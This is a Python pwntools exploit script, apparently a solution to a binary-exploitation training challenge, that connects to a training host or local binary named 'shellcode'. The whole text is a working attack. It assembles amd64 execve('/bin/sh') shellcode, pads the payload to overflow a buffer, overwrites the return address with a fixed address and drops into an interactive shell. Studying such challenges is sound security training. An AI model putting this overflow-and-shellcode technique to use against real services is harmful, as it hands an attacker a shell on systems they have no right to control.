
import sys
from pwn import *
from pwn import p64

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2001)
else:
    p = process("./shellcode")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x11223344
    c
    """)

shellcode = asm("""
mov rdi, 0x0068732f6e69622f
push rdi    
mov rdi, rsp          

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

payload = shellcode
payload = payload.ljust(1016, b"A")
payload += p64(0x601080)

p.recvuntil(b"What is your name?\n")
p.sendline(payload)
p.interactive()
